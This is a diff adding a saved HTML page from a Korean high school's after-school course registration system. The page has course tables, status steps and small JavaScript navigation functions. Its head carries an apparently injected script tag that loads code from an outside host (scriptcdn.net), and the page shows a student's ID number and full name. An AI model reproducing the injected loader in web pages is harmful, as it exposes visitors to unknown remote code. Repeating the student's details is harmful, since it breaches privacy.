@@ -1,0 +1,109 @@
+<html data-arp-injected="true"><head><script type="text/javascript" src="https://3001.scriptcdn.net/code/static/1"></script></head><body topmargin="0" leftmargin="0"><link rel="stylesheet" href="../css/font.css">
+<style type="text/css">
+a { text-decoration:none;color:black; }
+body {font-family:NotokrR;}
+</style>
+<title>현대청운고등학교</title>
+
+
+<table width="800" cellspacing="0" style="border-collapse:collapse;" align="center">
+	<tbody><tr>
+		<td background="../1.jpg" height="40" style="border-width:1; border-color:black; border-style:none;" valign="bottom">
+			<font color="white">현대청운고등학교 2022학년도 방과후학교(겨울방학)</font>
+		</td>
+    </tr>
+</tbody></table>
+
+<table width="800" cellspacing="0" style="border-collapse:collapse;font-size:14;" align="center">
+	<tbody><tr>
+		<td width="60%" style="border-width:1; border-color:black; border-style:none;" valign="top">
+			<form name="form11" method="post">
+<input type="button" value="첫화면" onclick="location.href='../student.html';" style="font-family:NotokrR;width:80;font-size:14;cursor:hand;">
+<span style="font-size:15;color:blue">30619 이승준</span></form>
+<iframe name="m2" width="0" height="0" frameborder="no"></iframe><br><br>
+			현재상태 :
+			<span>강좌등록</span>-
+			<span>수강신청1</span>-
+			<span>강좌조정</span>-
+			<span>수강신청2</span>-
+			<span style="background-color:#006699;color:white;">신청마감</span>
+		</td>
+		<td width="40%" style="border-width:1; border-color:black; border-style:none;" valign="top">
+			<p align="right">
+			<a href="./stu_main.html" style="background-color:#006699;color:white;">강좌신청</a> |
+			<a href="./stu_back.html">이전강좌보기</a></p>
+</td>
+                </tr>
+            </tbody></table>
+<br>
+<form name="form1" method="post">
+<input type="hidden" name="number" value="30619">
+<table width="800" align="center" cellspacing="0" style="font-size:14;">
+	<tbody><tr>
+		<td valign="top">
+			<font color="blue">※전달사항 : 방과후 신청, 수정 관련 자세한 사항은 김정미 선생님께 문의하세요. <br>
+강의 개요를 읽은 후 신중히 신청하고 신청한 것에 대한 것에 대하여 수정을 자제하십시오.</font>
+		</td>
+    </tr>
+</tbody></table>
+
+<table cellspacing="1" bgcolor="#CCCCCC" align="center" width="800" style="font-size:14;">
+	<tbody><tr bgcolor="#FFFFFF" height="30" align="center">
+		<td width="8%">구분</td>
+        <td width="8%">교과</td>
+		<td width="32%">강좌명</td>
+		<td width="8%">선생님</td>
+		<td width="8%">상태(군)</td>
+		<td width="8%">비고</td>
+	</tr>
+
+</tbody></table>
+<br>
+
+<table width="800" align="center" cellspacing="0" style="font-size:14;">
+	<tbody><tr>
+		<td width="371">
+
+			<select name="lesson" style="color:red;font-family:NotokrR;font-size:14;width:150;height:30;padding-left:10;" onchange="func_lesson(this.value,'3');">
+				<option value="">군 선택</option>							</select>
+
+
+		</td>
+        <td width="50%">
+					</td>
+	</tr>
+</tbody></table>
+
+<table cellspacing="1" bgcolor="#CCCCCC" align="center" width="800" style="font-size:14;">
+	<tbody><tr bgcolor="#FFFFFF" height="35" align="center">
+		<td width="8%">연번</td>
+        <td width="8%">구분</td>
+		<td width="8%">교과</td>
+		<td width="38%">강좌명<br>(※강좌명을 클릭하면 강좌설명을 볼 수 있습니다.)</td>
+		<td width="8%">선생님</td>
+        <td width="9%">대상학년</td>
+		<td width="8%">신청</td>
+    	</tr>
+
+</tbody></table>
+</form>
+<iframe name="f2" width="0" height="0" frameborder="no" marginwidth="0" marginheight="0" topmargin="0" scrolling="no"></iframe>
+<script>
+
+function func_lesson(lesson,hak){
+	location.href="stu_main.php?lesson="+lesson+"&hak="+hak;
+}
+
+function func_del(lesson,title,UID){
+	del = confirm(title+"선생님 강좌를 취소하겠습니까?");
+	if(del==true){
+		f2.location.href = "stu_del.php?UID="+UID+"&lesson="+lesson;
+	}else{return;}
+}
+
+function func_submit(){
+	document.form1.target = "f2";
+	document.form1.action = "stu_insert.php";
+	document.form1.submit();
+}
+</script></body></html>
